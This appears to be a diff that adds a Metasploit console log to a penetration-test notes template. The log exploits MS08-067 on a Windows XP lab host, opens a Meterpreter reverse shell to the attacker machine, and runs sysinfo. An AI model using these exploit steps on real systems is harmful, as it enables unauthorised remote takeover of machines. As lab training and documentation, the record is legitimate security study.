@@ -1,6 +1,43 @@
 https://www.offensive-security.com/metasploit-unleashed/scanner-netbios-auxiliary-modules/
 
 
+msf exploit(ms08_067_netapi) > use exploit/windows/smb/ms08_067_netapi
+
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+
+msf exploit(ms08_067_netapi) > set RHOST Interrupt: use the 'exit' command to quit
+msf exploit(ms08_067_netapi) > set RHOST 192.168.0.33
+RHOST => 192.168.0.33
+msf exploit(ms08_067_netapi) > set RPORT 139
+RPORT => 139
+msf exploit(ms08_067_netapi) > set SMBDirect false
+SMBDirect => false
+msf exploit(ms08_067_netapi) > set LHOST 192.168.0.129
+LHOST => 192.168.0.129
+msf exploit(ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.129:4444 
+[*] 192.168.0.33:139 - Automatically detecting the target...
+[*] 192.168.0.33:139 - Fingerprint: Windows XP - Service Pack 0 / 1 - lang:English
+[*] 192.168.0.33:139 - Selected Target: Windows XP SP0/SP1 Universal
+[*] 192.168.0.33:139 - Attempting to trigger the vulnerability...
+[*] Sending stage (179267 bytes) to 192.168.0.33
+[*] Meterpreter session 1 opened (192.168.0.129:4444 -> 192.168.0.33:1854) at 2017-12-07 14:51:43 -0500
+
+meterpreter > sysinfo
+Computer        : UNIVERSI-Q2S87T
+OS              : Windows XP (Build 2600, Service Pack 1).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > 
+
+
+
+
 Potential Vulnerability:
 
 	DESCRIPTION, CVE, PORT etc. GOES HERE
